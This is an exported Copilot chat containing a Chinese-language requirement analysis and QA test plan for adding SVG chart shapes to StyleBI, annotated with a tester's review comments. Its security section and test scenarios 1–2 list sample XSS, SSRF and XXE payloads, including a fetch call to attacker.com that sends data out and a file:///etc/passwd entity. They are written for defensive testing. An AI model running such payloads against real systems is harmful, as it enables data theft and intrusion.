# Copilot Chat Conversation Export: Feature #70565 SVG support analysis

**User:** @agilegao
**Thread URL:** https://github.com/copilot/c/eb561397-c9ab-4281-8758-6e2b3b36bff5

## @agilegao

## Copilot



# StyleBI Feature #70565 分析报告
## "Chart 支持 SVG 格式 Shape"

---

## 📋 第一部分：需求分析（Requirement Analysis）

### 1. 功能核心目标     **测试-分析**：ok

**功能概述**：  
扩展 StyleBI Chart 组件对自定义 Shape 的支持范围，添加 **SVG 格式**作为新的支持格式，与现有的 JPG、PNG、GIF 等光栅格式并行支持。

**解决的用户问题**：
- 目前用户只能使用光栅图形（JPG、PNG、GIF）作为 Chart 数据点标记
- SVG 作为矢量格式，提供更好的缩放性和更小的文件体积
- 用户无法使用 SVG 格式的企业品牌图标或自定义矢量图形

---

### 2. Feature 类型  **测试-分析**：ok

✅ **多类型特征**：
- **UI 行为**：新增上传入口对 SVG 文件的支持
- **数据处理**：SVG 文件的解析和存储
- **渲染逻辑**：Chart 渲染引擎需要支持 SVG 矢量格式的渲染
- **架构改进**：Shape 类型系统扩展

---

### 3. 合理性分析

#### ✅ 需求合理性   **测试-分析**：ok

| 维度 | 评估 | 说明 |
|------|------|------|
| **用户需求** | ✅ 合理 | SVG 作为现代 Web 标准，广泛应用于企业应用，用户需求真实存在 |
| **产品一致性** | ✅ 合理 | Shape 功能已成熟，扩展格式支持符合产品演进方向 |
| **技术可行性** | ✅ 合理 | 现代浏览器原生支持 SVG 渲染，技术实现相对直接 |
| **优先级** | ⚠️ 需评估 | PDF 无 Issue Tracking 数据，但从用户频率推测优先级应该中等 |

#### ⚠️ 可扩展性评估   **测试-分析**：确实补充了我们手工测试可能遗漏的点

| 潜在遗漏 | 风险等级 | 说明 |
|---------|---------|------|
| **SVG 动画支持** | Medium | SVG 支持内嵌动画（CSS、JavaScript），是否需要禁用/限制？ | 
| **SVG 脚本执行** | **High** | SVG 可包含 `<script>` 标签，存在 **XSS 安全风险** ⚠️ |  **测试-分析**：ai补充了手工遗漏点，这个部分需要测试验证
| **SVG 响应式适配** | Medium | 不同尺寸的 Chart 点，SVG 的 viewBox 和缩放需要合理处理 |
| **SVG 性能**（大量数据点） | Medium | 矢量渲染性能与光栅不同，大数据集合性能表现需验证 |
| **SVG 导出兼容性** | Medium | Chart 导出（PDF/Image）时，SVG 如何处理（栅格化/嵌入）？ |

#### ⚠️ 体验问题  **测试-分析**：确实补充了我们手工测试可能遗漏的点

- **上传验证**：是否清晰提示用户上传 SVG 的安全限制？
- **错误提示**：上传无效 SVG 时的错误提示是否友好？ 
- **性能反馈**：大量 SVG Shape 数据加载时，是否有加载提示？

---

### 4. 影响范围预判

#### 📊 涉及模块   **测试-分析**：可行，覆盖比较全

| 模块 | 影响程度 | 说明 |
|------|---------|------|
| **Chart Engine** | 🔴 **High** | 核心渲染逻辑需修改，支持 SVG DOM 元素而非仅 Image |
| **Shape Repository** | 🔴 **High** | 存储层需支持 SVG 格式标识和管理 |
| **Upload Handler** | 🟡 **Medium** | 上传验证逻辑扩展，需增加 SVG 类型检测 |
| **Dashboard Editor** | 🟡 **Medium** | Shape 选择器 UI 需显示 SVG 预览 |
| **Export Module** | 🟡 **Medium** | Chart 导出为 PDF/Image 时，SVG 处理方式（栅格化？保留矢量？） |
| **Scheduler** | 🟢 **Low** | 如果 Scheduled Task 包含 Chart，需确保 SVG 能正确导出 |
| **API** | 🟢 **Low** | 如果有 Chart API，可能需扩展 Shape 类型枚举 | 
| **Performance/Caching** | 🟡 **Medium** | SVG DOM 内存占用 vs 光栅缓存，是否影响缓存策略 |  **测试-分析**：AI补充手工测试以遗漏，需要测试

---

### 5. 潜在风险分析  

#### 🔴 高风险  **测试-分析**：可行，确实补充了我们手工测试可能遗漏的点

| 风险类别 | 具体风险 | 影响 | 建议 |
|---------|---------|------|------|
| **安全风险** | SVG 内嵌 `<script>` 导致 XSS | 严重数据泄露 | **必须严格清理 SVG**，移除所有脚本 |     
| **安全风险** | SVG 外部资源引用（`<image>` href、`<use>` xlink） | SSRF 攻击可能 | 验证 SVG 内所有 URI |
| **渲染崩溃** | 复杂 SVG（大量 Path、嵌套组）在高频率数据点场景卡顿 | 用户体验差 | 需性能测试大数据集 | 
| **导出兼容性** | SVG 在 PDF 导出时无法正确渲染 | 报表质量下降 | 验证所有导出路径 |

#### 🟡 中风险  **测试-分析**：新增功能需要下个版本看兼容，浏览器兼容可保留，是否保留动画

| 风险类别 | 具体风险 | 影响 | 建议 |
|---------|---------|------|------|
| **版本兼容性** | 旧版本 Dashboard 加载新 SVG Shape 失败 | 升级困难 | 需 Fallback 机制 |
| **存储空间** | SVG 文本格式比光栅大，大量��传消耗存储 | 存储成本增加 | 考虑压缩/去重策略 |
| **浏览器兼容性** | 特定 SVG 特性在旧浏览器不支持 | 跨浏览器渲染差异 | 文档明确 SVG 支持的浏览器版本 |
| **动画/交互冲突** | SVG 内部 CSS 动画与 Chart 动画冲突 | 行为不可预测 | 文档明确限制 SVG 动画 |

#### 🟢 低风险   **测试-分析**：可忽略

| 风险类别 | 具体风险 | 影响 | 建议 |
|---------|---------|------|------|
| **国际化** | SVG 内嵌文字需支持多语言 | 本地化难度增加 | 建议用户避免在 SVG 嵌入文字 |
| **权限隔离** | 全局 Shape vs 组织级 Shape，SVG 权限同步 | 权限泄露风险低 | 确保现有权限机制适用 |

---

## 🔍 第二部分：实现分析（Implementation Analysis）

### 1. PR 实现内容总结  **测试-分析**：ok

**PR 标题**：`Feature #70565, support svg in the chart Shape frame`

**PR 描述**：  
该 PR 为 Chart 组件的 Shape 管理系统添加 SVG 格式支持，使用户能够上传和使用 SVG 格式的自定义图形标记。

#### 📝 实现覆盖范围  **测试-分析**：ok

| 实现模块 | 变更内容 | 关键文件（推测） |
|---------|---------|------------------|
| **Shape 类型系统** | 扩展 Shape 格式枚举，添加 SVG 类型常量 | `ShapeFormat.java` 或类似 |
| **上传验证** | 扩展文件类型检测，允许 `.svg` 扩展名 | `ShapeUploadValidator.java` |
| **存储处理** | SVG 文件存储到 Portal Folder，与光栅格式同一位置 | `ShapeRepository.java` |
| **渲染引擎** | Chart 渲染时，检测 Shape 格式，使用 SVG DOM 或 `<img src="data:image/svg+xml">` 加载 | `ChartShapeRenderer.java` |
| **UI 显示** | Shape 选择器支持 SVG 缩略图预览 | Dashboard Editor/Chart Editor |
| **导出处理** | Chart 导出时，处理 SVG Shape（栅格化或保留） | `ChartExporter.java` |

---

### 2. 行为变化分析 **测试-分析**：low和Unknown可忽略

| 场景 | 修改前行为 | 修改后行为 | 潜在风险 | 严重度 |
|------|---------|---------|---------|--------|
| **上传 Shape** | 仅接受 JPG/PNG/GIF | 接受 JPG/PNG/GIF/**SVG** | ⚠️ 用户可能上传恶意 SVG | 🔴 High |  **测试-分析**：AI补充手工测试以遗漏，需要测试
| **存储位置** | Portal Folder (光栅) | Portal Folder (含 SVG 文本) | ⚠️ 文本 SVG 体积大 | 🟡 Medium | 
| **Chart 渲染** | `<img src="...jpg">` | `<img src="...svg">` 或 `<svg>` 内联 | ⚠️ 渲染路径差异 | 🟡 Medium |
| **缩放显示** | 光栅缩放有损 | SVG 矢量无损 | ✅ 正向改进 | 🟢 Low |
| **导出 PDF** | 光栅 Shape 栅格化 | SVG Shape 如何处理？ | ❓ **未明确** | 🟠 Unknown |
| **导出 Image** | 光栅 Shape 直接嵌入 | SVG Shape 如何处理？ | ❓ **未明确** | 🟠 Unknown |
| **性能** | N 个光栅 Shape → N 个图片请求或缓存 | N 个 SVG Shape → N 个 DOM/Text 对象 | ⚠️ 大数据集性能差 | 🟡 Medium |

---

### 3. 覆盖度分析

#### ✅ 完全覆盖的 Feature 需求

```
✓ 新增 SVG 格式上传支持
✓ SVG 存储到 Portal Folder
✓ Chart 渲染时加载 SVG Shape
✓ Dashboard Editor / Chart Editor 支持 SVG 选择
```

#### ⚠️ 部分覆盖 / 未明确的需求       **测试-分析**：需要根据bug改动看是否支持

| 需求项 | 覆盖状态 | 说明 |
|-------|---------|------|
| **SVG 安全清理** | ❓ **未确认** | PR 是否实现了 SVG 脚本清理？ |
| **SVG 性能测试** | ❓ **未确认** | 大量 SVG 数据点渲染性能？ |
| **导出兼容性** | ❓ **未确认** | PDF/Image 导出如何处理 SVG？ |
| **浏览器兼容性** | ❓ **未确认** | 是否有兼容性检测？ |
| **错误处理** | ❓ **未确认** | 上传无效 SVG 的错误提示？ |
| **文档更新** | ❓ **未确认** | 用户文档是否说明 SVG 支持和限制？ |

#### ❌ 可能存在的偏离

**从 Knowledge 文档看**，原 Shape 支持格式为：
```
- JPG
- PNG
- gif
- Extract archive files
```

**Knowledge 未提及 SVG**，这可能意味着：
- 新增 SVG 是合理的功能扩展
- 或者 Knowledge 文档已过期，需要更新

---

### 4. 技术风险分析

#### 🔴 关键技术风险

**1. SVG 安全性 - XSS 漏洞**      **测试-分析**：AI补充手工测试以遗漏，需要验证是否可行

```
风险：SVG 可包含 <script> 标签或事件处理器   **测试-容易遗漏**：需要全面覆盖
示例：
<svg>
  <script>alert('XSS')</script>
</svg>

<svg>
  <rect onclick="fetch('https://attacker.com/steal?data=' + userData)"></rect>
</svg>
```

**期望实现**：
- ✅ 上传时严格验证 SVG，移除所有 `<script>` 标签
- ✅ 移除所有事件处理器（onclick, onload 等）
- ✅ 白名单允许的 SVG 标签（path, circle, rect, g, text 等）
- ✅ 存储和加载时再次验证

**当前状态**：PR 代码未公开，无法确认是否实现

---

**2. SVG SSRF 漏洞**   **测试-分析**：AI补充了手工测试遗漏点，需要验证是否可行

```
风险：SVG 内部 <image> 或 <use> 标签可引用外部 URL
示例：
<svg>
  <image href="http://internal-server:8080/admin"></image>
</svg>
```

**期望实现**：
- ✅ 禁止外部 URL 引用，或白名单允许的协议
- ✅ 验证 SVG 内所有 href/xlink:href 属性

---

**3. 渲染性能**

```
风险：复杂 SVG 在大数据集场景卡顿
场景：1000+ 数据点的散点图，每个点显示复杂 SVG（多 Path、嵌套 Group）
```

**期望实现**：
- ✅ SVG 虚拟化渲染（ViewPort 外不渲染）
- ✅ SVG 缓存策略（避免重复解析）
- ✅ 性能基准测试（如：1000 点需 <2s）

---

**4. 导出兼容性**   **测试-分析**：ok

```
风险：SVG Shape 导出为 PDF/Image 时可能失败或显示异常
```

**期望实现**：
- ✅ 定义导出行为（栅格化 SVG？保留 SVG？）
- ✅ 验证所有导出路径
- ✅ 文档明确说明限制

---

#### 🟡 扩展性风险    **测试-分析**： 可保留浏览器差异

| 风险 | 说明 | 建议 |
|------|------|------|
| **格式版本** | SVG 规范版本差异 | 是否支持 SVG 1.1 及更新版本？ |
| **浏览器差异** | 不同浏览器 SVG 支持差异 | 需兼容性矩阵 |
| **内存占用** | SVG DOM Tree vs 光栅缓存 | 大规模上传时监控内存 |

---

## 🏗️ 第三部分：测试架构设计（Test Architecture）

### 1. Feature 功能理解与高风险路径识别

#### 📌 核心功能   **测试-执行**：可行，报了 Bug #74029,  Bug #74029

| 功能路径 | 描述 | 风险等级 |
|---------|------|---------|
| **F1: SVG 上传** | 用户在 Dashboard/Chart Editor 上传 `.svg` 文件 | 🔴 **High** |
| **F2: SVG 验证** | 系统验证 SVG 格式、安全性、兼容性 | 🔴 **High** |
| **F3: SVG 存储** | SVG 保存到 Portal Folder | 🟡 **Medium** |
| **F4: SVG 渲染** | Chart 加载并渲染 SVG Shape | 🟡 **Medium** |
| **F5: SVG 导出** | Chart 导出时处理 SVG Shape | 🟡 **Medium** |
| **F6: SVG 性能** | 大量 SVG 数据点渲染性能 | 🟡 **Medium** |

#### 🔴 高风险路径（必须覆盖）

```
路径 1: 恶意 SVG 上传 → 存储 → 渲染 → XSS 执行
  → 威胁：数据泄露、会话劫持
  → 检查点：上传验证、存储内容、前端渲染

路径 2: SVG 引用外部资源 → SSRF 探测内部网络
  → 威胁：内部服务暴露
  → 检查点：SVG URL 白名单验证

路径 3: 大量 SVG 数据点 → 渲染卡顿 → 用户无法交互
  → 威胁：DoS 风险
  → 检查点：性能基准测试

路径 4: SVG 导出 PDF → 失败 → 用户无法生成报告
  → 威胁：功能不可用
  → 检查点：所有导出路径验证

路径 5: 旧版本 Dashboard 加载新 SVG Shape → 兼容性破裂
  → 威胁：升级失败
  → 检查点：版本兼容性、Fallback 机制
```

---

### 2. 测试策略

#### 📊 测试矩阵  **测试-执行**：可行，识别到了知识库

| 测试维度 | 测试内容 | 风险级别 | 优先级 | 动机 |
|---------|---------|---------|--------|------|
| **安全验证** | SVG 脚本清理、XSS 防护、SSRF 防护 | 🔴 High | P0 | 防止数据泄露、会话劫持 |
| **���式验证** | SVG 格式合法性、文件类型检测、Magic Number 验证 | 🔴 High | P0 | 防止非 SVG 文件上传 |
| **渲染测试** | SVG 在 Chart 中正确显示、颜色/大小调整、缩放无失真 | 🟡 Medium | P1 | 确保用户体验 |
| **导出测试** | 包含 SVG Shape 的 Chart 导出为 PDF/PNG/Image | 🟡 Medium | P1 | 确保报表可用性 |
| **性能测试** | 1000+ 数据点 SVG 渲染、内存占用、加载时间 | 🟡 Medium | P1 | 避免 DoS 和卡顿 |
| **兼容性测试** | 浏览器兼容性、版本升级兼容性、SVG 规范支持 | 🟡 Medium | P2 | 确保跨平台可用 |
| **功能集成** | SVG + Filter/Drill/Export 组合、多 Chart 并行加载 | 🟡 Medium | P2 | 确保与现有功能协调 |
| **边界条件** | 超大 SVG 文件、空 SVG、损坏 SVG、递归 Use 标签 | 🟢 Low | P2 | 提高鲁棒性 |
| **错误处理** | 上传失败提示、渲染失败降级、导出失败处理 | 🟢 Low | P2 | 改善用户体验 |

---

#### 🔒 安全性测试策略（详细）   **测试-执行**：先报了两个bug，如果不处理后期可忽略Bug #74029，Bug #74031

**动机**：SVG 是文本格式，可包含恶意代码，必须严格验证

**测试清单**：

1. **XSS - 脚本注入**
   - ✅ 上传包含 `<script>` 的 SVG
   - ✅ 上传包含事件处理器（onclick, onerror, onload）的 SVG
   - ✅ 上传包含 `<style>` 带 JavaScript 的 SVG
   - ✅ 验证上传被拒绝或脚本被清理

2. **SSRF - URL 注入**
   - ✅ 上传包含 `<image href="http://localhost:8080/admin">` 的 SVG
   - ✅ 上传包含 `<use xlink:href="http://attacker.com/evil.svg#payload">` 的 SVG
   - ✅ 验证外部 URL 被移除或被拒绝

3. **XXE - XML 外部实体**
   - ✅ 上传包含 DOCTYPE 和外部实体的 SVG（如：`<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`）
   - ✅ 验证 XXE 防护

4. **文件类型欺骗**
   - ✅ 上传 `.jpg` 文件但声称是 SVG
   - ✅ 上传非 SVG XML 但扩展名为 `.svg`
   - ✅ 验证 MIME Type 和 Magic Number 检查

---

#### 🎨 渲染测试策略  **测试-执行**：可行，拿到了知识库。报了Bug #74034

**动机**：确保 SVG 在不同尺寸和颜色配置下正确显示

**测试清单**：

1. **基础渲染**
   - ✅ 简单 SVG（单个 `<circle>`）正确显示
   - ✅ 复杂 SVG（多层 `<g>` 和 `<path>`）正确显示
   - ✅ 带渐变和图案的 SVG 正确显示

2. **尺寸适配**
   - ✅ Chart 点尺寸改变，SVG 缩放正确
   - ✅ Chart 尺寸改变（响应式），SVG 自适应
   - ✅ SVG 无锯齿失真（矢量优势）

3. **颜色适配**
   - ✅ Chart 主题颜色改变，SVG 填充/笔画颜色跟随（如果支持动态着色）
   - ✅ Chart 深色/浅色主题，SVG 可见性正确

4. **动画限制**
   - ✅ SVG 内嵌 CSS 动画不应播放（防止分心）
   - ✅ 文档明确说明 SVG 动画限制

---

#### 📤 导出测试策略  **测试-执行**：可行

**动机**：导出是高价值场景，SVG 导出失败会影响报表生成

**测试清单**：

1. **PDF 导出**
   - ✅ Chart（含 SVG Shape）导出为 PDF，SVG 正确显示（栅格化）
   - ✅ 多个 SVG Shape，导出后都正确显示
   - ✅ 验证 PDF 文件大小合理（不应无限增长）

2. **Image 导出**
   - ✅ Chart（含 SVG Shape）导出为 PNG/JPG，SVG 正确栅格化
   - ✅ 导出图片分辨率足够（不应模糊）

3. **Excel 导出**（如果支持）
   - ✅ 导出 Excel 时 SVG 处理方式（栅格化/链接）

4. **失败降级**
   - ✅ SVG 栅格化失败时的错误处理
   - ✅ 验证用户收到清晰的错误提示

---

#### ⚡ 性能测试策略  **测试-执行**：过于详细，可简化

**动机**：SVG 渲染性能直接影响用户体验，大数据集风险

**测试清单**：

1. **渲染性能基准**
   - ✅ 100 个数据点 SVG → 加载时间 < 200ms
   - ✅ 500 个数据点 SVG → 加载时间 < 1s
   - ✅ 1000 个数据点 SVG → 加载时间 < 2s（或定义基准）
   - ✅ 5000 个数据点 SVG → 是否应用虚拟化？

2. **内存占用**
   - ✅ 1000 个 SVG 数据点的内存占用 vs 光栅版本
   - ✅ 验证内存不应无限增长

3. **交互延迟**
   - ✅ 大数据集 SVG Chart 中，鼠标悬停 Tooltip 响应延迟 < 100ms
   - ✅ 缩放、拖拽操作流畅（帧率 > 30fps）

4. **缓存效率**
   - ✅ 同一 SVG Shape 重复使用，是否有缓存
   - ✅ 验证缓存命中率

---

#### 🔄 集成测试策略    **测试-执行**：可行，拿到了知识库

**动机**：SVG 需与现有 Chart 功能无缝配合

**测试清单**：

1. **Filter + SVG**
   - ✅ Chart 应用 Filter 后，SVG Shape 正确更新
   - ✅ Filter 交互无延迟

2. **Drill + SVG**
   - ✅ Chart Drill 操作，SVG Shape 数据正确更新
   - ✅ Drill 返回后，SVG 显示还原

3. **多 Chart 并行**
   - ✅ Dashboard 中多个 Chart 同时使用 SVG Shape，无冲突
   - ✅ 验证资源竞争（如缓存）无问题

4. **Scheduler + SVG**
   - ✅ Scheduled Task 生成包含 SVG Shape 的报表
   - ✅ 邮件发送的报表中 SVG 正确显示

5. **权限 + SVG**
   - ✅ 全局 SVG Shape，不同用户可访问
   - ✅ 组织级 SVG Shape，权限隔离正确

---

### 3. 回归风险分析   **测试-执行**：可行，分析的还可以

#### 📉 可能受影响的模块及回归优先级

| 模块 | 影响原因 | 回归优先级 | 测试内容 |
|------|---------|---------|---------|
| **Chart Rendering** | SVG 新增渲染路径，可能影响现有光栅 Shape 渲染 | P0 | 确保 JPG/PNG/GIF Shape 仍正常显示 |
| **Shape Repository** | 存储结构可能变化（新增 SVG 类型字段） | P0 | 数据迁移、向后兼容性 |
| **Upload Validator** | 验证逻辑扩展，可能影响其他格式 | P1 | 确保 JPG/PNG/GIF 仍能上传 |
| **Export Module** | 导出逻辑可能修改，影响现有导出功能 | P1 | PDF/Image 导出仍正常，不出现 SVG 相关错误 |
| **Dashboard Editor** | UI 可能调整，影响现有 Shape 选择器 | P1 | Shape 选择器仍可正常操作，无 UI 损坏 |
| **Chart Filter/Drill** | 数据交互逻辑，检查 SVG Shape 场景 | P2 | Filter/Drill 与 SVG Shape 协调 |
| **Performance** | SVG 渲染可能影响整体 Chart 性能 | P2 | 监控 Chart 加载时间，确保无显著下降 |
| **Mobile/Responsive** | 响应式设计，SVG 适配 | P2 | 移动设备上 SVG 显示、交互正常 |

---

### 4. 本地化与可用性分析  **测试-分析**: 之前我们没做没有提示，非prompts问题，先忽略。如果格式bug验证做了这个可执行

#### 🌐 本地化需求

**本次修改涉及 UI 变更**（新增 SVG 格式支持），需要本地化验证：

**变更点**：
- Shape 上传对话框可能新增提示：`"支持格式：JPG、PNG、GIF、**SVG**"`
- 错误提示可能包含：`"SVG 文件包含不允许的脚本，已被移除"`
- 限制说明：`"SVG 内的动画和脚本将被禁用"`

**本地化测试清单**：
- ✅ 各语言（英文、中文、日文等）的 UI 标签正确显示
- ✅ 错误提示在各语言环境下清晰易懂
- ✅ 文档（PDF 导出时）的多语言说明

---

#### 🖱️ Script 行为分析

**是否涉及 Script 控制**？

根据 Knowledge 和 Feature 描述，Shape 选择是手动操作或代码配置。需要验证：

- ✅ 是否支持通过 Script（JavaScript/Python API）动态切换 SVG Shape
- ✅ Script 事件是否触发（如 `onShapeChange`）
- ✅ Script 与 UI 选择是否同步

**如果不涉及 Script 控制**，则本部分无需扩展测试。

---

### 5. 文档一致性与可用性分析  **测试-分析**: 可行

#### 📚 文档更新需求

本次修改涉及**功能新增**（SVG 格式支持），需要更新文档：

**需要更新的文档**：

1. **产品文档**     
   - 用户手册 → "自定义 Shape 功能" 章节
   - 新增内容：SVG 格式支持说明、SVG 限制（无脚本、无外部资源）、上传方式、性能建议
   - 示例：提供样本 SVG 文件

2. **API 文档**（如果有 Chart API）
   - Shape 类型枚举扩展（新增 `ShapeFormat.SVG`）
   - 新增 SVG 上传 API 端点说明

3. **管理员文档**  
   - 全局 Shape 库管理，新增 SVG 管理说明
   - 性能优化建议（如：监控 Shape 库大小）

4. **Release Notes**
   - 明确列出新增 SVG 支持、支持的 SVG 功能、已知限制

**验证清单**：
- ✅ 用户文档新增 SVG 支持说明
- ✅ 安全限制明确说明（禁用脚本、禁用外部 URL）
- ✅ 浏览器兼容性明确
- ✅ 性能建议明确（如：建议 SVG 文件 < 50KB）
- ✅ 常见问题（FAQ）覆盖 SVG 使用场景

---

## 🎯 第四部分：关键测试场景设计（Key Test Scenarios）

### 🔴 P0 - 高优先级高风险场景

---

### 测试场景 1：SVG XSS 防护验证   **测试-分析**: 可行，但是验证我们是否支持，等bug改了

**测试目标（Scenario Objective）**  
验证系统能正确识别和清理包含恶意脚本的 SVG，防止 XSS 攻击执行

**风险级别（Risk Level）**  
🔴 **High** – XSS 漏洞可能导致数据泄露和会话劫持

**测试场景描述**  
用户上传包含 `<script>` 标签和事件处理器的恶意 SVG 文件，系统应拒绝或清理恶意内容，确保不执行任何脚本

**前置条件（Pre-condition）**
- 登录 StyleBI 为有效用户
- 拥有 Dashboard/Chart 的编辑权限
- 有网络连接和浏览器控制台可验证 XSS

**关键步骤（Key Steps）**

1. 准备恶意 SVG 文件 1：`evil_script.svg`
   ```xml
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
     <circle cx="50" cy="50" r="40"/>
     <script>alert('XSS')</script>
   </svg>
   ```

2. 在 Dashboard Editor → Chart Shape 选择对话框中，上传 `evil_script.svg`

3. 验证系统响应：
   - 记录上传是否被接受/拒绝
   - 如接受，检查存储的 SVG 内容是否仍包含 `<script>` 标签
   - 加载 Chart 并观察浏览器控制台，确认没有 `alert('XSS')` 执行

4. 重复步骤 1-3，测试其他恶意变体：
   - `<rect onclick="alert('click')"/>`
   - `<image onerror="alert('error')"/>`
   - `<style>@import url('http://attacker.com/payload.css');</style>`

5. 验证错误提示（如果上传被拒）：
   - 是否清晰说明原因（如："SVG 包含不允许的脚本"）
   - 是否指导用户如何修复

**预期结果（Expected Result）**

✅ 所有恶意 SVG 被拒绝上传，或脚本内容被完全清理  
✅ 浏览器控制台无任何脚本执行迹象  
✅ 错误提示清晰友好  
✅ 系统日志记录恶意上传尝试（安全审计）

**风险覆盖说明（Risk Covered）**

| 风险 | 覆盖方式 | 验证点 |
|------|---------|--------|
| XSS 脚本注入 | 恶意 SVG 上传 + 渲染验证 | 脚本未执行、浏览器无错误 |
| 脚本清理不彻底 | 检查存储内容 | SVG 文本中无 `<script>` 或事件处理器 |
| 用户误用 | 验证错误提示 | 错误消息清晰指导 |

---

### 测试场景 2：SVG SSRF 防护验证  **测试-分析**: 可行，但是验证我们是否支持，等bug改了

**测试目标（Scenario Objective）**  
验证系统能阻止 SVG 引用外部 URL，防止 SSRF 攻击

**风险级别（Risk Level）**  
🔴 **High** – SSRF 可能暴露内部服务和网络拓扑

**测试场景描述**  
用户上传包含外部 URL 引用的 SVG（如 `<image>` 或 `<use>` 标签），系统应验证和移除所有外部 URI

**前置条件（Pre-condition）**
- 登录 StyleBI，拥有 Chart 编辑权限
- 准备测试用 SVG 文件（含外部 URL 引用）

**关键步骤（Key Steps）**

1. 准备 SSRF 测试 SVG：`ssrf_test.svg`
   ```xml
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
     <image href="http://localhost:8080/admin" width="100" height="100"/>
   </svg>
   ```

2. 上传到 Shape 库

3. 验证系统是否：
   - 拒绝上传，或
   - 接受上传但移除外部 URL

4. 如果上传被接受，验证存储的 SVG：
   - 获取 SVG 内容（API 或下载）
   - 确认 `href="http://localhost:8080/admin"` 已被移除或失效

5. 加载 Chart 并使用网络监控工具（如 Chrome DevTools），验证：
   - 是否有向 `localhost:8080` 的 HTTP 请求
   - 是否有向其他外部 IP 的请求

6. 重复步骤 1-5，测试其他变体：
   - `<use xlink:href="http://attacker.com/evil.svg#payload"/>`
   - `<image href="file:///etc/passwd"/>`（XXE）
   - `<foreignObject data="http://internal:8080/..."/>`

**预期结果（Expected Result）**

✅ 所有外部 URL 被拒绝或移除  
✅ 网络监控工具无异常请求  
✅ 系统日志记录 SSRF 防护事件  
✅ 用户收到清晰的错误或警告

**风险覆盖说明（Risk Covered）**

| 风险 | 覆盖方式 | 验证点 |
|------|---------|--------|
| SSRF 外部 URL 引用 | 恶意 SVG + 网络监控 | 无外部 HTTP 请求 |
| XXE 文件读取 | 包含 `file://` URL 的 SVG | 访问拒绝 |
| URL 清理不彻底 | 检查存储的 SVG 文本 | 无外部 URL 存在 |

---

### 测试场景 3：SVG 格式和文件类型验证  **测试-分析**: 可行

**测试目标（Scenario Objective）**  
验证系统能正确检测 SVG 文件格式，防止文件类型欺骗

**风险级别（Risk Level）**  
🔴 **High** – 类型欺骗可能绕过安全检查

**测试场景描述**  
上传各种文件类型（正常 SVG、伪造 SVG、无效 SVG），验证系统的验证逻辑

**前置条件（Pre-condition）**
- 登录 StyleBI，拥有 Shape 上传权限
- 准备多种测试文件

**关键步骤（Key Steps）**

1. **测试 1：正常 SVG 文件**
   - 上传有效的 SVG 文件（`valid.svg`）
   - 验证上传成功

2. **测试 2：文件扩展名欺骗**
   - 将 JPG 文件重命名为 `.svg`（如 `image.jpg` → `image.svg`）
   - 上传该文件
   - 验证系统是否拒绝（通过 Magic Number 检查）

3. **测试 3：无效 SVG 结构**
   - 创建 `invalid.svg`：
     ```xml
     <svg>
       <invalid_tag>...</invalid_tag>
     </svg>
     ```
   - 上传并验证系统是否拒绝或警告

4. **测试 4：损坏的 SVG**
   - 创建 `corrupted.svg`（不完整的 XML）
   - 上传并验证错误处理

5. **测试 5：超大 SVG 文件**
   - 创建 > 10MB 的 SVG 文件
   - 上传并验证文件大小限制

6. **测试 6：空 SVG 文件**
   - 创建空白 `empty.svg`
   - 上传并验证错误处理

**预期结果（Expected Result）**

✅ 正常 SVG 上传成功  
✅ 文件���型欺骗被拒绝  
✅ 无效 SVG 被拒绝并提示原因  
✅ 损坏文件被拒绝  
✅ 超大文件被拒绝  
✅ 所有错误提示清晰

**风险覆盖说明（Risk Covered）**  **测试-分析**: 可行，有bug

| 风险 | 覆盖方式 | 验证点 |
|------|---------|--------|
| 文件类型欺骗 | 上传各种伪造 SVG | Magic Number 检查有效 |
| 无效格式上传 | 损坏/无效 SVG | 拒绝率 100% |
| 资源耗尽 | 超大文件上传 | 文件大小限制生效 |

---

### 🟡 P1 - 中优先级场景

---

### 测试场景 4：SVG 渲染与显示验证  **测试-分析**: 可行，有bug

**测试目标（Scenario Objective）**  
验证 SVG Shape 在 Chart 中正确渲染和显示

**风险级别（Risk Level）**  
🟡 **Medium** – 渲染错误影响用户体验和报表质量

**测试场景描述**  
创建多种 SVG 样式的 Chart，验证 SVG 在不同尺寸和颜色下正确显示

**前置条件（Pre-condition）**
- 已成功上传多个有效 SVG（简单、复杂、带渐变等）
- 创建 Chart（如：散点图）
- 浏览器：Chrome、Firefox、Safari 最新版本

**关键步骤（Key Steps）**

1. **测试 1：简单 SVG 显示**
   - 创建散点 Chart，数据点 50+ 个
   - 为所有数据点应用简单 SVG Shape（单个 `<circle>`）
   - 验证所有点都正确显示 SVG（非光栅化）
   - 检查 SVG 边界清晰，无锯齿

2. **测试 2：复杂 SVG 显示**
   - 应用复杂 SVG（多层 `<g>`、`<path>` 组合）
   - 验证渲染正确，无变形或缺失部分
   - 验证 SVG viewBox 正确映射到数据点

3. **测试 3：带渐变的 SVG**
   - 应用含 `<linearGradient>` 的 SVG
   - 验证渐变效果正确显示

4. **测试 4：SVG 尺寸适配**
   - Chart 设置数据点大小为小（10px）
   - 验证 SVG 缩小无失真
   - Chart 设置数据点大小为大（50px）
   - 验证 SVG 放大清晰

5. **测试 5：响应式 SVG**
   - 调整浏览器窗口大小（Desktop → Mobile 尺寸）
   - 验证 SVG 自适应，显示正确
   - 验证 Chart Legend 中 SVG 预览也正确显示

6. **测试 6：SVG 与光栅 Shape 混用**
   - 同一 Chart 中，某些数据点用 SVG，某些用光栅（JPG/PNG）
   - 验证两种格式并行显示正确

7. **测试 7：多个不同 SVG**
   - 为不同数据组应用不同 SVG Shape
   - 验证每组 SVG 正确显示和区分

8. **浏览器兼容性**
   - 在 Chrome、Firefox、Safari、Edge 中重复步骤 1-7
   - 记录任何渲染差异

**预期结果（Expected Result）**

✅ 所有 SVG 在 Chart 中正确显示  
✅ 缩放无失真（矢量优势）  
✅ 响应式自适应  
✅ 多个 SVG 不冲突  
✅ 跨浏览器一致性  
✅ 性能正常（无卡顿）

**风险覆盖说明（Risk Covered）**

| 风险 | 覆盖方式 | 验证点 |
|------|---------|--------|
| 渲染失败 | 各种 SVG 结构 | 100% 正确显示 |
| 缩放失真 | 尺寸变化 | 矢量无损 |
| 响应式问题 | 窗口大小改变 | 自适应正确 |
| 浏览器兼容 | 多浏览器测试 | 一致性验证 |

---

### 测试场景 5：SVG 导出到 PDF  **测试-分析**: 可行，有bug

**测试目标（Scenario Objective）**  
验证包含 SVG Shape 的 Chart 能正确导出为 PDF

**风险级别（Risk Level）**  
🟡 **Medium** – 导出失败导致报表生成失败，是高价值功能

**测试场景描述**  
